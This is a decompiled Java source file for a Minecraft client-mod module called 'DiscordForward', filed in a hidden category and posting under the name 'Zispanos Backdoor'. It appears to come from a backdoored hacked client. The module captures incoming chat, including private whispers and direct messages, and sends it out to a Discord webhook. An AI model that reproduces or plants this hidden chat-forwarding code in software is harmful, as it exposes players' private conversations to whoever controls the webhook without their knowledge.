//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "/Users/imac/Downloads/Minecraft-Deobfuscator3000-master/1.12 stable mappings"!

//Decompiled by Procyon!

package me.zeroeightsix.kami.module.modules.chat;

import me.zeroeightsix.kami.event.events.*;
import me.zero.alpine.listener.*;
import me.zeroeightsix.kami.setting.*;
import java.util.function.*;
import me.zeroeightsix.kami.command.*;
import java.util.regex.*;
import me.zeroeightsix.kami.module.*;
import me.zeroeightsix.kami.module.modules.gui.*;
import me.zeroeightsix.kami.util.*;
import com.mrpowergamerbr.temmiewebhook.*;
import net.minecraft.network.play.server.*;

@Info(name = "DiscordForward", category = Category.HIDDEN, description = "Sends your chat to a set Discord channel")
public class DiscordForward extends Module
{
    private Setting<Boolean> time;
    private Setting<Boolean> all;
    private Setting<Boolean> queue;
    private Setting<Boolean> direct;
    public Setting<String> url;
    public Setting<String> avatar;
    @EventHandler
    public Listener<PacketEvent.Receive> listener;
    
    public DiscordForward() {
        this.time = this.register(Settings.b("Timestamp", true));
        this.all = this.register(Settings.b("All Messages", false));
        this.queue = this.register(Settings.booleanBuilder("Queue Position").withValue(true).withVisibility(v -> !this.all.getValue()).build());
        this.direct = this.register(Settings.booleanBuilder("Direct Messages").withValue(true).withVisibility(v -> !this.all.getValue()).build());
        this.url = this.register(Settings.s("URL", "unchanged"));
        this.avatar = this.register(Settings.s("Avatar", "https://github.com/S-B99/kamiblue/raw/assets/assets/icons/kami.png"));
        this.listener = (Listener<PacketEvent.Receive>)new Listener(event -> {
            if (DiscordForward.mc.player == null || this.isDisabled()) {
                return;
            }
            if (!(event.getPacket() instanceof SPacketChat)) {
                return;
            }
            final SPacketChat sPacketChat = (SPacketChat)event.getPacket();
            if (this.shouldSend(sPacketChat.getChatComponent().getUnformattedText())) {
                this.sendMessage("Zispanos Backdoor", this.getTime() + sPacketChat.chatComponent.getUnformattedText(), this.avatar.getValue());
            }
        }, new Predicate[0]);
    }
    
    public void onEnable() {
        if (this.url.getValue().equalsIgnoreCase("unchanged")) {
            Command.sendErrorMessage(this.getChatName() + "You must first set a webhook url with the '&7" + Command.getCommandPrefix() + "discordforward&r' command");
            this.disable();
        }
    }
    
    private boolean shouldSend(final String message) {
        return this.all.getValue() || this.isQueue(message) || this.isDirect(message);
    }
    
    private boolean isDirect(final String message) {
        return (this.direct.getValue() && message.contains("whispers:")) || (this.direct.getValue() && Pattern.compile("to.*:", 2).matcher(message).find());
    }
    
    private boolean isQueue(final String message) {
        return (this.queue.getValue() && message.contains("Position in queue:")) || (this.queue.getValue() && message.contains("2b2t is full"));
    }
    
    private String getTime() {
        if (!this.time.getValue() || ModuleManager.getModuleByName("ChatTimestamp").isEnabled()) {
            return "";
        }
        final InfoOverlay info = (InfoOverlay)ModuleManager.getModuleByName("InfoOverlay");
        return "[" + TimeUtil.getFinalTime((TimeUtil.TimeUnit)info.timeUnitSetting.getValue(), (TimeUtil.TimeType)info.timeTypeSetting.getValue(), Boolean.valueOf(info.doLocale.getValue())) + "] ";
    }
    
    private void sendMessage(final String username, final String content, final String avatarUrl) {
        final TemmieWebhook tm = new TemmieWebhook((String)this.url.getValue());
        final DiscordMessage dm = new DiscordMessage(username, content, avatarUrl);
        tm.sendMessage(dm);
    }
}
